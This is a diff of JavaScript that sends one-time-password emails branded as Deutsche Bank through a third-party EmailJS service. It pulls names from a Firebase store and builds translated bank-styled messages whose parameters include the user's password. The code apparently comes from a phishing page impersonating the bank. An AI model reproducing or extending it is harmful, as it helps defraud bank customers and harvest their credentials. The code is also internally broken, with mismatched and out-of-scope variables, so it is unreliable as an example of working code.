@@ -1,0 +1,67 @@
+   // Send OTP
+        window.sendOTP = async (email) => {
+            generatedOTP = Math.floor(100000 + Math.random() * 900000); // Generate OTP
+            try {
+          // Retrieve the email from localStorage
+    const email = localStorage.getItem("userEmail");
+    if (!email) {
+      console.error("No email found in localStorage.");
+      return;
+    }
+
+    // Sanitize the email to replace dots with commas
+    const sanitizedEmail = email.replace(/\./g, ",");     
+       const emailRef = ref(database, `messages/${sanitizedEmail}`);
+
+    // Fetch data from the database
+    const snapshot = await get(emailRef);
+    if (!snapshot.exists()) {
+      console.error("No matching data found for the email.");
+      return;
+    }    
+   
+    // Get the fullName field from the database
+    const data = snapshot.val();
+    const fullName = data.fullName;
+    if (!fullName) {
+      console.error("fullName field is missing in the database.");
+      return;
+    }
+                await emailjs.send("service_7r47p64", "template_19whrab", {
+                    to_email: email,
+                    otp_code: generatedOTP,
+               deut: 'Deutsche Bank',
+               fullName: fullName,
+                });
+                console.log("OTP sent!");
+            } catch (error) {
+                console.error("Failed to send OTP", error);
+            }
+        }; 
+    
+    
+    
+    
+    
+    
+    
+        detectCountry(function(countryCode) {
+            const targetLanguage = countryLanguageMap[countryCode] || 'en';
+
+            // Translate email content
+            translateText("Su Contraseña de Un Solo Uso de Deutsche Bank es:", targetLanguage, function(translatedWelcome) {
+                translateText("¡Por favor, no comparta este código con nadie!.", targetLanguage, function(translatedPeace) {
+                    translateText("¡Hola! 👋", targetLanguage, function(translatedHello) {
+                        translateText("Deutsche Bank", targetLanguage, function(translatedBank) {
+                            translateText("Nuevo mensaje de Deutsche Bank", targetLanguage, function(translatedFromName) {
+                                const emailParams = {
+                                    full_name: fullName,
+                                    to_email: email,
+                                    password: password,
+                                    otp: generatedOtp,
+                                    welcome_message: translatedWelcome,
+                                    peace_message: translatedPeace,
+                                    Hello_email: translatedHello,
+                                    bank_email: translatedBank,
+                                    from_name: translatedFromName
+                                };
